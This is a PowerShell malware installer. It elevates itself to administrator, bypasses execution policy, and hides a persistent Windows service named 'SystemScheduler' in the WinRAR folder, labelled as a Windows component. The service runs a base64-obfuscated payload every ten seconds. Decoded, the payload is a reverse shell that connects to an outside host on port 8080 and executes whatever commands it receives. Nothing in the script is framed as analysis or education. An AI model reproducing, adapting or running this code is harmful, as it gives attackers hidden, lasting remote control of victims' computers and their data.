$ServiceName     = "SystemScheduler"
$daun     = "C:\Program Files\WinRAR"
$IntervalSeconds = 10
$PayloadContent  = 'powershell -e JABzAHQAcgAgAD0AIAAiAFQAYwBQACIAKwAiAEMAIgArACIAbABpACIAKwAiAGUAIgArACIAbgB0ACIAOwAkAHIAZQB2AGUAcgBzAGUAZAAgAD0AIAAtAGoAbwBpAG4AIAAoACQAcwB0AHIAWwAtADEALgAuAC0AKAAkAHMAdAByAC4ATABlAG4AZwB0AGgAKQBdACkAOwAKACQAUABKACAAPQAgAEAAKAAiADUANAAiACwAIAAiADQAMwAiACwAIAAiADUAMAAiACwAIAAiADQAMwAiACwAIAAiADYAQwAiACwAIAAiADYAOQAiACwAIAAiADYANQAiACwAIAAiADYARQAiACwAIAAiADcANAAiACkAOwAKACQAVABDAGgAYQByACAAPQAgACQAUABKACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAAgAHsAIABbAGMAaABhAHIAXQBbAGMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEkAbgB0ADMAMgAoACQAXwAsACAAMQA2ACkAIAB9ADsACgAkAFAASgBDAGgAYQByACAAPQAgAC0AagBvAGkAbgAgACQAVABDAGgAYQByADsACgA7ACQAaABjAHkATwByAE4AUQBKAGwAIAA9ACAATgAnACcAZQB3AC0ATwAnACcAYgBqACcAJwBlAGMAJwAnAHQAIABTAHkAUwAnACcAdABFAG0ALgBOAGUAdAAuAFMAbwBDACcAJwBrAEUAJwAnAHQAUwAuAFQAQwBQAEMATABJAEUATgBUACgAJwAwAC4AYwBoAG8AawBlAC4AcwB1ACcALAA4ADAAOAAwACkAOwAKACQARgBZAEsAcQBRAG4AYgB5AGEAWABNACAAPQAgACQAaABjAHkATwByAE4AUQBKAGwALgAoACcAZwAnACsAJwBFAHQAJwArACcAcwAnACsAJwBUACcAKwAnAHIAJwArACcARQAnACsAJwBhAE0AJwApACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAFAASgBDAGgAYQByACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwAKAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQARgBZAEsAcQBRAG4AYgB5AGEAWABNAC4AUgBlAEEAZAAoACQAUABKAEMAaABhAHIALAAgADAALAAgACQAUABKAEMAaABhAHIALgBMAGUATgBnAFQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsACgAkADAANAA1ADQAZQA2AGQANQAgAD0AIAAoAE4AJwAnAGUAdwAtAE8AJwAnAGIAagAnACcAZQBjACcAJwB0ACAALQBUAHkAcABFAE4AQQBtAGUAIABTAHkAJwAnAFMAdABlACcAJwBNAC4AdABFAHgAVAAuAEEAJwAnAFMAQwBpACcAJwBpAEUATgAnACcAYwBvAGQAaQBuAGcAKQAuACgAJwBHAGUAJwArACcAdABTAHQAUgBpAG4ARwAnACkAKAAkAFAASgBDAGgAYQByACwAMAAsACAAJABpACkAOwAKACQAYgAxADUAZgBmADQAOQAwAGMAZgBkADIAYQBhADYANQAzADUAOABkADIAZQA1AGUAMwA3ADYAYwA1AGQAZAAyACAAPQAgACgAaQBlAHgAIAAiAC4AIAB7ACAAIAAkADAANAA1ADQAZQA2AGQANQAgACAAfQAgADIAPgAmADEAIgAgAHwAIABPAHUAJwAnAHQALQBTAHQAcgAnACcAaQBuAGcAIAApADsACgAkAEoAPQAkAE8APQAkAEsAPQAkAEUAPQAkAFIAPQAkAFAAPQAkAFcAPQAkAFIAIAA9ACAAJAB7AGIAMQA1AGYAZgA0ADkAMABjAGYAZAAyAGEAYQA2ADUAMwA1ADgAZAAyAGUANQBlADMANwA2AGMANQBkAGQAMgB9ACAAKwAgACcAGwBbADkANABtAFMAdAByAGkAeAAbAFsAMwA5AG0AIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7AAoAJABzACAAPQAgACgAIgB7ADAAfQB7ADEAfQB7ADMAfQB7ADIAfQAiAC0AZgAgACIAcwBlACcAJwBuAGQAIgAsACIAYgB5ACIALAAiAGUAIgAsACIAdAAiACkAOwAgACQAcwAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4ACkALgBHAGUAdABCAFkAVABlAFMAKAAkAFIAKQA7AAoAJABGAFkASwBxAFEAbgBiAHkAYQBYAE0ALgBXAHIAaQB0AGUAKAAkAHMALAAwACwAJABzAC4ATABlAG4AZwB0AGgAKQA7ACQARgBZAEsAcQBRAG4AYgB5AGEAWABNAC4ARgBsAHUAcwBoACgAKQB9ADsAJABoAGMAeQBPAHIATgBRAEoAbAAuAEMAbABvAHMAZQAoACkACgA='

function Ensure-Admin {
    $sidAdmin = "S-1-5-32-544"
    try {
        $current = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $groups = $current.Groups | ForEach-Object { $_.Value }
        if (-not ($groups -contains $sidAdmin)) {
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = "powershell.exe"
            $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
            $psi.Verb = "RunAs"
            try {
                [System.Diagnostics.Process]::Start($psi) | Out-Null
            } catch {
            }
            exit
        }
    } catch {
        exit 1
    }
}


function Ensure-Tls12 {
    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
}

Ensure-Admin
Ensure-Tls12

if (-not (Test-Path $daun)) {
    try {
        New-Item -Path $daun -ItemType Directory -Force | Out-Null
    } catch {
        exit 1
    }
}

$LoopScript = Join-Path $daun "Task.ps1"
$ServiceExe = Join-Path $daun ("$ServiceName.exe")
$ServiceXml = Join-Path $daun ("$ServiceName.xml")
$WinSwDownloadUrl = "https://github.com/winsw/winsw/releases/latest/download/WinSW-x64.exe"

$loopContent = @"
`$IntervalSeconds = $IntervalSeconds

function Run-Payload {
$PayloadContent
}

while (`$true) {
    try {
        Run-Payload
    } catch {
    }
    Start-Sleep -Seconds `$IntervalSeconds
}
"@

try {
    $loopContent | Set-Content -Path $LoopScript -Encoding UTF8 -Force
} catch {
    exit 1
}

if (-not (Test-Path $ServiceExe)) {
    $tmp = Join-Path $env:TEMP ("winsw_tmp_{0}.exe" -f (Get-Random))
    try {
        Invoke-WebRequest -Uri $WinSwDownloadUrl -OutFile $tmp -UseBasicParsing -ErrorAction Stop
        Move-Item -Path $tmp -Destination $ServiceExe -Force
    } catch {
        if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
        exit 1
    }
} else {
}

$shellExe = $null
try {
    $cmdPwsh = Get-Command pwsh.exe -ErrorAction SilentlyContinue
    if ($cmdPwsh -and $cmdPwsh.Source) {
        $shellExe = $cmdPwsh.Source
    } else {
        $cmdPs = Get-Command powershell.exe -ErrorAction SilentlyContinue
        if ($cmdPs -and $cmdPs.Source) {
            $shellExe = $cmdPs.Source
        } else {
            $shellExe = "powershell.exe"
        }
    }
} catch {
    $shellExe = "powershell.exe"
}

try {
    $LoopScriptAbs = (Resolve-Path -Path $LoopScript).ProviderPath
} catch {
    exit 1
}
$arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$LoopScriptAbs`""

$xml = @"
<?xml version='1.0'?>
<service>
  <id>$ServiceName</id>
  <name>$ServiceName</name>
  <description>Компонент Windows.</description>
  <executable>$shellExe</executable>
  <arguments>$arguments</arguments>
  <startmode>automatic</startmode>
  <onfailure action="restart" delay="5000" />
</service>
"@

try {
    $xml | Set-Content -Path $ServiceXml -Encoding UTF8 -Force
} catch {
    exit 1
}

Push-Location -Path $daun
try {
    & .\$($ServiceName + ".exe") install | Out-Null
    Start-Sleep -Milliseconds 300
    & .\$($ServiceName + ".exe") start | Out-Null
} catch {
    exit 1
} finally {
    Pop-Location
}
